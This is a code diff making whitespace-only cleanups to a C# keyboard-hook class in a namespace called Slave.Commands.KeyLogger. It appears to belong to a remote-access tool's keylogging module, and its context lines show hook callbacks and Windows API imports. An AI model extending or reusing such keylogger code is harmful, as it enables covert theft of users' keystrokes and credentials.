@@ -21,7 +21,7 @@ namespace Slave.Commands.KeyLogger
         /// </summary>
         /// <param name="keyPressed">VKeys</param>
         public delegate void KeyboardHookCallback(string keyPressed);
-        
+
         public event KeyboardHookCallback KeyDown;
         public event KeyboardHookCallback KeyUp;
 
@@ -31,7 +31,6 @@ namespace Slave.Commands.KeyLogger
         IntPtr hookID = IntPtr.Zero;
 
         public bool listening = false;
-
 
         /// <summary>
         /// Install low level keyboard hook
@@ -79,7 +78,7 @@ namespace Slave.Commands.KeyLogger
                         KeyUp?.Invoke(KeyboardKeys.VKeys[Marshal.ReadInt32(lParam)]);
                 }
             }
-            
+
             return CallNextHookEx(hookID, nCode, wParam, lParam);
         }
 
@@ -112,6 +111,6 @@ namespace Slave.Commands.KeyLogger
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-        #endregion
+        #endregion WinAPI
     }
 }
